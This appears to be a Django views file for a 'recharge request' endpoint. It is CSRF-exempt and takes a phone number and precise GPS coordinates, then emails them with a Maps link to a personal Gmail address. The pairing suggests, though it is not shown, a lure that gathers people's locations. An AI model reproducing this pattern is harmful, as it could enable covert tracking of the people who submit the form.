from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
import re
from django.core.mail import send_mail

def home(request):
    return render(request, 'home.html')

@csrf_exempt
def save_location(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body.decode('utf-8'))
            latitude = data.get("latitude")
            longitude = data.get("longitude")
            phone = data.get("phone")

            if not phone:
                return JsonResponse({"error": "Phone number required"}, status=400)

            location_text = f"Latitude: {latitude}, Longitude: {longitude}" if latitude and longitude else "Location not provided"

            # Validate phone number (must be 10 digits)
            if not re.fullmatch(r"\d{10}", phone):
                return JsonResponse({"error": "Invalid phone number. Enter a 10-digit number."}, status=400)

            # Google Maps link
            google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"

            # Email content
            subject = "Recharge Request + Location"
            message = f"Phone: {phone}\nLocation: {latitude}, {longitude}\nGoogle Maps: {google_maps_link}"
            send_mail(
                subject, message, "swapeatmail@gmail.com", ["piyushphysics834@gmail.com"]
            )

            return JsonResponse({"message": "Recharge request received"})

        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON format"}, status=400)

    return JsonResponse({"error": "Invalid request method"}, status=400)
